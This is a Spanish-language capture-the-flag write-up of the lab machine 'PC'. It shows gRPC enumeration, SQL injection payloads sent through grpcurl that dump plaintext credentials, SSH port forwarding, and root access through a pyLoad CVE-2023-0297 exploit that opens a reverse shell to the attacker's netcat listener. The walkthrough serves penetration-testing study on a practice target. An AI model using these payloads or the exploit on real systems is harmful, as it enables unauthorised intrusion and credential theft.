---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# PC

`PC` es una máquina Linux de dificultad fácil que cuenta con un punto final `gRPC` que es vulnerable a la inyección SQL. Después de enumerar y volcar el contenido de la base de datos, las credenciales de texto sin formato conducen al acceso `SSH` a la máquina. Al enumerar los puertos que se ejecutan localmente, se revela una versión obsoleta del servicio `pyLoad`, que es susceptible a la ejecución remota de código (RCE) previa a la autenticación a través de `CVE-2023-0297`. Como el servicio lo ejecuta `root`, explotar esta vulnerabilidad conduce a privilegios completamente elevados.

<figure><img src="../../.gitbook/assets/PC.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **PC**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.214 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 11:18 CET
Initiating SYN Stealth Scan at 11:18
Scanning 10.10.11.214 [65535 ports]
Discovered open port 22/tcp on 10.10.11.214
SYN Stealth Scan Timing: About 23.48% done; ETC: 11:20 (0:01:41 remaining)
SYN Stealth Scan Timing: About 51.90% done; ETC: 11:20 (0:00:57 remaining)
Discovered open port 50051/tcp on 10.10.11.214
Completed SYN Stealth Scan at 11:20, 101.72s elapsed (65535 total ports)
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.032s latency).
Scanned at 2025-02-20 11:18:33 CET for 102s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.80 seconds
           Raw packets sent: 131146 (5.770MB) | Rcvd: 129 (7.692KB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.214
	[*] Open ports: 22,50051

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentra el servicio `SSH` en el puerto `22` expuesto y un servicio llamado `grpc` en el puerto `50051`.

```bash
❯ nmap -sCV -p22,50051 10.10.11.214 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 11:21 CET
Nmap scan report for 10.10.11.214
Host is up (0.059s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  grpc
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%), Linux 5.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   81.20 ms 10.10.16.1
2   81.35 ms 10.10.11.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (424).png" alt=""><figcaption></figcaption></figure>

## gRPC Enumeration with grpcurl and gRPC UI

De los puertos expuestos que se encuentran en la máquina, solamente disponemos del puerto `50051` que corresponde al servicio de `gRPC` para tratar de buscar alguna vulnerabilidad, poder encontrar información que nos permite acceder al equipo, etc.

{% hint style="info" %}
gRPC es un sistema de llamada a procedimiento remoto de código abierto desarrollado inicialmente en Google. Utiliza como transporte HTTP/2 y Protocol Buffers como lenguaje de descripción de interfaz.
{% endhint %}

Realizando una búsqueda por Internet, nos encontramos con el siguiente blog en el cual nos mostraban diferentes técnicas y ejemplos de cómo enumerar el servicio de `gRPC` en el ámbito del `pentest`.

{% embed url="https://sanaullahamankorai.medium.com/penetration-testing-grpc-techniques-examples-and-code-snippets-d508f6c08783" %}

Para lograr interactuar con el servicio, decidimos utilizar la herramienta de [`grpcurl`](https://github.com/fullstorydev/grpcurl). En la propia documentación de la herramienta se nos mostraban diferentes ejemplos también del uso.

Al intentar realizar la enumeración, se nos mostraba un mensaje de error indicando que el servidor no respondió con el protocolo `TLS`, ya que `gRPC` normalmente funciona con `TLS` de manera predeterminada.

```bash
❯ grpcurl 10.10.11.214:50051 list
Failed to dial target host "10.10.11.214:50051": tls: first record does not look like a TLS handshake
```

Realizamos una comprobación del panel de ayuda de la herramienta y comprobamos que tenemos la opción `-plaintext` para indicar a `grpcurl`que no utilice `TLS`.

```bash
❯ grpcurl -h 2>&1 | grep TLS -2
  -plaintext
    	Use plain-text HTTP/2 when connecting to server (no TLS).
```

A través de la directiva `list`, hemos podido enumerar los servicios del servidor. En este caso, nos encontramos con un servicio llamado `SimpleApp` y otro denominado `ServerReflection`.

El servicio `ServerReflection` permite realizar consultas al servidor para obtener información sobre los servicios disponibles, como los métodos y tipos de mensajes que maneja, sin necesidad de tener acceso previo a los archivos `.proto`. Esto facilita la introspección dinámica del servidor y nos da visibilidad sobre su estructura, lo cual puede ser clave para interactuar con él de manera efectiva.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

Al ejecutar el comando `grpcurl` para listar los métodos disponibles en el servicio **SimpleApp**, encontramos las siguientes funciones disponibles:

* **SimpleApp.LoginUser**
* **SimpleApp.RegisterUser**
* **SimpleApp.getInfo**

Estos métodos nos permiten interactuar con el servicio y realizar diversas acciones, como iniciar sesión, registrar usuarios o recuperar información.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Al ejecutar el comando `grpcurl` para describir el servicio `SimpleApp`, obtuvimos la siguiente estructura del servicio:

`SimpleApp` es un servicio que ofrece tres métodos RPC:

* **LoginUser**: Recibe un mensaje de tipo `.LoginUserRequest` y devuelve un mensaje de tipo `.LoginUserResponse`.
* **RegisterUser**: Recibe un mensaje de tipo `.RegisterUserRequest` y devuelve un mensaje de tipo `.RegisterUserResponse`.
* **getInfo**: Recibe un mensaje de tipo `.getInfoRequest` y devuelve un mensaje de tipo `.getInfoResponse`.

Estos métodos permiten interactuar con el servicio **SimpleApp** y realizar las operaciones correspondientes de acuerdo a los tipos de mensajes definidos.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

Al ejecutar el comando `grpcurl` para describir los mensajes asociados a los métodos del servicio `SimpleApp`, obtuvimos la siguiente estructura de mensajes:

1. **LoginUserRequest**:\
   Es un mensaje que contiene dos campos:
   * `username`: tipo `string`
   * `password`: tipo `string`
2. **LoginUserResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`
3. **RegisterUserRequest**:\
   Es un mensaje que contiene dos campos:
   * `username`: tipo `string`
   * `password`: tipo `string`
4. **RegisterUserResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`
5. **getInfoRequest**:\
   Es un mensaje que contiene un campo:
   * `id`: tipo `string`
6. **getInfoResponse**:\
   Es un mensaje que contiene un campo:
   * `message`: tipo `string`

Estos mensajes están estructurados para ser enviados y recibidos durante la ejecución de las funciones del servicio `SimpleApp`, facilitando la comunicación entre el cliente y el servidor.

```bash
❯ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserResponse
LoginUserResponse is a message:
message LoginUserResponse {
  string message = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserResponse
RegisterUserResponse is a message:
message RegisterUserResponse {
  string message = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
❯ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoResponse
getInfoResponse is a message:
message getInfoResponse {
  string message = 1;
}
```

Al realizar la solicitud con `grpcurl` para registrar un nuevo usuario, hemos obtenido la siguiente respuesta.

Esto indica que se ha creado correctamente la cuenta para el usuario `gzzcoo1` con la contraseña `Gzzcoo123`.

```bash
❯ grpcurl -format text -d 'username: "gzzcoo1",password: "Gzzcoo123"' -plaintext 10.10.11.214:50051 SimpleApp.RegisterUser
message: "Account created for user gzzcoo1!"
```

Al realizar la solicitud con grpcurl para iniciar sesión con el usuario gzzcoo1 y la contraseña Gzzcoo123, obtuvimos la siguiente respuesta:

> **message: "Your id is 435."**

Además, en los encabezados de la respuesta, se nos entregó un token de autenticación válido:

> **token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo'**

Este token está asociado al usuario gzzcoo1 con el id 435 y puede usarse para realizar solicitudes autenticadas en futuras interacciones con el servicio SimpleApp.

```bash
❯ grpcurl -vv -format text -d 'username: "gzzcoo1",password: "Gzzcoo123"' -plaintext 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
message: "Your id is 435."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo'
Sent 1 request and received 1 response
Timing Data: 576.425221ms
  Dial: 56.026738ms
    BlockingDial: 56.00054ms
  InvokeRPC: 358.309362ms
```

La respuesta que recibimos indica que la solicitud para obtener información a través del método `getInfo` fue rechazada debido a un error de autorización.

Esto significa que necesitamos incluir el token de autenticación en la cabecera de la solicitud para que el servidor nos permita acceder a la información. Podemos hacerlo añadiendo el token que recibimos anteriormente al encabezado `token`.

```bash
❯ grpcurl -format text -d 'id: "435"' -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "Authorization Error.Missing 'token' header"
```

Al incluir el token correctamente en la solicitud, hemos recibido la siguiente respuesta, la cual no nos ofrece ningún tipo de información interesante.

```bash
❯ TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZ3p6Y29vMSIsImV4cCI6MTc0MDAzMTMyNX0.P0skEoAiBqW6BiH6E4m1nOutqPax4bGItF0mg0BPcjo
❯ grpcurl -format text -d 'id: "435"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "Will update soon."
```

Por otro lado, también podemos hacer uso de la herramienta de `gRPC UI` para realizar los mismos comandos anteriores pero a través de una interfaz web.

```bash
❯ grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:41843/
```

Utilizaremos el servicio `SimpleApp` con el método `RegisterUser` y trataremos de registrar un usuario nuevo. Para enviar la solicitud le deberemos de dar a la opción de `Invoke`.

<figure><img src="../../.gitbook/assets/imagen (428).png" alt="" width="431"><figcaption></figcaption></figure>

En la respuesta por parte del servidor&#x20;

<figure><img src="../../.gitbook/assets/imagen (429).png" alt="" width="339"><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (430).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (431).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (432).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (433).png" alt=""><figcaption></figcaption></figure>



## Initial Access

### SQL Injection in SQLite trough grpcurl (Enumerating Tables, Columns and Data)



{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" %}

```bash
❯ grpcurl -format text -d 'id: "435 UNION SELECT 1;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "1"

❯ grpcurl -format text -d 'id: "435 UNION SELECT sqlite_version();"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "3.31.1"
```



```bash
❯ grpcurl -format text -d "id: \"435 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "accounts,messages"
```



```bash
❯ grpcurl -format text -d "id: \"435 UNION SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('accounts');\"" -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "username,password"
```



```bash
❯ grpcurl -format text -d 'id: "435 UNION SELECT GROUP_CONCAT(username || \":\" || password) FROM accounts;"' -H "token: $TOKEN" -plaintext 10.10.11.214:50051 SimpleApp.getInfo
message: "admin:admin,sau:HereIsYourPassWord1431"
```



```bash
❯ sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ cat user.txt 
bf851c74a19dd325d1b505280dbbed5a
```

## Privilege Escalation

### Discover Ineternal Web Server (SSH Port Forwarding)



```bash
sau@pc:~$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::50051                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
unix  2      [ ACC ]     SEQPACKET  LISTENING     23552    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     43060    /run/user/1001/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     43067    /run/user/1001/bus
unix  2      [ ACC ]     STREAM     LISTENING     43068    /run/user/1001/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     43069    /run/user/1001/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     43070    /run/user/1001/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     23534    @/org/kernel/linux/storage/multipathd
unix  2      [ ACC ]     STREAM     LISTENING     43071    /run/user/1001/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     43072    /run/user/1001/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     43073    /run/user/1001/pk-debconf-socket
unix  2      [ ACC ]     STREAM     LISTENING     28227    /var/snap/lxd/common/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     43074    /run/user/1001/snapd-session-agent.socket
unix  2      [ ACC ]     STREAM     LISTENING     23521    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     23523    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     23532    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     23537    /run/systemd/fsck.progress
unix  2      [ ACC ]     STREAM     LISTENING     23547    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     23831    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     28224    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     28106    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     28230    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     28232    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     28234    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     31745    /run/irqbalance//irqbalance805.sock
unix  2      [ ACC ]     STREAM     LISTENING     28226    @ISCSIADM_ABSTRACT_NAMESPACE
sau@pc:~$ curl 127.0.0.1:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
sau@pc:~$ curl 127.0.0.1:9666
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F">/login?next=http%3A%2F%2F127.0.0.1%3A9666%2F</a>. If not, click the link.
```



```bash
❯ sshpass -p HereIsYourPassWord1431 ssh -L 8000:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.10.11.214
Last login: Thu Feb 20 03:36:26 2025 from 10.10.16.3
sau@pc:~$ 
```





<figure><img src="../../.gitbook/assets/5174_vmware_7198sIDIMU.png" alt=""><figcaption></figcaption></figure>

### pyLoad 0.5.0 Exploitation - Prea-auth Remote Code Execution \[RCE] (CVE-2023-0297)



```bash
sau@pc:~$ ps aux | grep pyload
root        1045  0.0  1.6 1217800 65964 ?       Ssl  02:20   0:03 /usr/bin/python3 /usr/local/bin/pyload
sau         1881  0.0  0.0   8160  2396 pts/0    S+   03:39   0:00 grep --color=auto pyload
sau@pc:~$ /usr/local/bin/pyload --version
pyLoad 0.5.0
```



```bash
❯ searchsploit pyLoad
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                                                                                                                                                | python/webapps/51532.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



```bash
❯ git clone https://github.com/JacobEbben/CVE-2023-0297; cd CVE-2023-0297
Clonando en 'CVE-2023-0297'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (10/10), 4.13 KiB | 1.38 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ python3 exploit.py -t http://localhost:8000 -I 10.10.16.3 -P 443
[SUCCESS] Running reverse shell. Check your listener!
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.214] 50060
bash: cannot set terminal process group (1045): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# cat /root/root.txt
cat /root/root.txt
f12c72922dc295ddf5220953e296fc59
```





### Analyzing how works payload



```bash
❯ HTTP_PROXY=http://127.0.0.1:8080 python3 exploit.py -t http://localhost:8000 -c 'whoami > /tmp/whoami'
[SUCCESS] Running your command: "whoami > /tmp/whoami"!
```

<figure><img src="../../.gitbook/assets/imagen (425).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/5177_vmware_r7HrtyzDIO.png" alt=""><figcaption></figcaption></figure>
